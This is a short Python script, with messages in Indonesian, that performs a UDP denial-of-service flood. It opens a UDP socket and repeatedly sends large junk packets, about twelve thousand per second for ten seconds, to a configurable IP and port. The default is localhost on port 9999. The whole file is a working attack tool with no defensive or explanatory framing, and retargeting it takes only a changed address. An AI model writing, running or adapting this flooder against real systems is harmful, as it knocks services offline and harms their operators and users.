import socket
import time

target_ip = "127.0.0.1"
target_port = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = b"A" * 4839

def udp_dos(target_ip, target_port, duration):
    print(f"Mulai serangan UDP DoS ke {target_ip}:{target_port} selama {duration} detik...")
    end_time = time.time() + duration
    packet_count = 0
    while time.time() < end_time:
        for _ in range(12207):
            sock.sendto(data, (target_ip, target_port))
            packet_count += 1
        time.sleep(1)
    print(f"Serangan selesai. Total paket yang dikirim: {packet_count}")

duration = 10
udp_dos(target_ip, target_port, duration)

